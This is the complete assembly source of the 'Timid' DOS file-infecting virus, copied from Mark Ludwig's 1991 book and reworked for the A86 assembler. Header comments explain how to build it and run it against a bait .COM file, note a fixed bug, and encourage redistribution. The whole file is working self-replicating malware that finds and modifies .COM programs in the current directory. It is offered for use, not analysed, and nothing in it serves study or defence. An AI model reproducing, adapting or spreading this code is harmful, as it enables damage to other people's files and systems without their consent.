;TIMID VIRUS asm by Mark Ludwig in 1991.
;
;-infects .coms only in current directory unless called by dos path statement
;-announces each file infected.
;297bytes=eff. length
;Copied from Mark Ludwig's "The Little Black Book of Computer Viruses"
;Slightly modified for A86 assembly.
;-asm makes a 64k file, run against 'bait' .com to get 297 byte virus
;-fixed bug in code reprinted in his book.
;all infected files will have VI at byte position 4-5.
;Mark Ludwig claims copyright on this virus and said he will
; sue anyone distributing his viruses around.  I say have fun!.


main    segment byte
        assume cs:main, ds:main, ss:nothing

        org 100h

host:
        jmp near ptr virus_start
        db 'VI'                 ;identifies virus
        mov ah, 4ch
        mov al, 0
        int 21h

virus:

comfile db      '*.com',0

virus_start:
        call get_start

get_start:
        sub word ptr [vir_start], offset get_start - offset virus
        mov dx, offset dta
        mov ah, 1ah
        int 21h
        call find_file
        jnz exit_virus
        call infect
        mov dx, offset fname
        mov [handle] b,24h
        mov ah, 9
        int 21h
exit_virus:                             ;bug was here in book
        mov dx, 80h
        mov ah, 1ah
        int 21h
        mov bx, [vir_start]
        mov ax, word ptr [bx+(offset start_code)-(offset virus)]
        mov word ptr [host], ax
        mov ax, word ptr [bx+(offset start_code)-(offset virus)+2]
        mov word ptr [host+2],ax
        mov al, byte ptr [bx+(offset start_code)-(offset virus)+4]
        mov byte ptr [host+4], al
        mov [vir_start], 100h
        ret
start_code:
        nop
        nop
        nop
        nop
        nop

find_file:
        mov dx, [vir_start]
        add dx, offset comfile-offset virus
        mov cx, 3fh
        mov ah, 4eh
        int 21h

ff_loop:
        or al,al
        jnz ff_done
        call file_ok
        jz ff_done
        mov ah, 4fh
        int 21h
        jmp ff_loop

ff_done:
        ret

file_ok:
        mov dx, offset fname
        mov ax, 3d02h
        int 21h
        jc fok_nzend
        mov bx, ax
        push bx
        mov cx, 5
        mov dx, offset start_image
        mov ah, 3fh
        int 21h
        pop bx
        mov ah, 3eh
        int 21h
        mov ax, word ptr [fsize]
        add ax, offset endvirus - offset virus
        jc fok_nzend
        cmp byte ptr [start_image], 0e9h
        jnz fok_zend

fok_nzend:
        mov al, 1
        or al,al
        ret

fok_zend:
        xor al,al
        ret

infect:
        mov dx, offset fname
        mov ax, 3d02h
        int 21h
        mov word ptr [handle],ax

        xor cx,cx
        mov dx,cx
        mov bx, word ptr [handle]
        mov ax, 4202h
        int 21h

        mov cx, offset final -offset virus
        mov dx, [vir_start]
        mov bx, word ptr [handle]
        mov ah, 40h
        int 21h

        xor cx,cx
        mov dx, word ptr [fsize]
        add dx, offset start_code-offset virus
        mov bx, word ptr [handle]
        mov ax, 4200h
        int 21h

        mov cx, 5
        mov bx, word ptr [handle]
        mov dx, offset start_image
        mov ah, 40h
        int 21h

        xor cx,cx
        mov dx,cx
        mov bx, word ptr [handle]
        mov ax, 4200h
        int 21h

        mov bx, [vir_start]
        mov byte ptr [start_image], 0e9h
        mov ax, word ptr [fsize]
        add ax, offset virus_start-offset virus-3
        mov word ptr [start_image+1], ax
        mov word ptr [start_image+3], 4956h

        mov cx, 5
        mov dx, offset start_image
        mov bx, word ptr [handle]
        mov ah, 40h
        int 21h

        mov bx, word ptr [handle]
        mov ah, 3eh
        int 21h
        ret

final:

;data area
endvirus equ $ + 212
org 0ff2ah

dta db 1ah dup (?)
fsize dw 0,0
fname db 13 dup (?)
handle dw 0
start_image db 0,0,0,0,0
vstack dw 50h dup (?)
vir_start dw (?)

main ends
end     host
;end of timid.asm










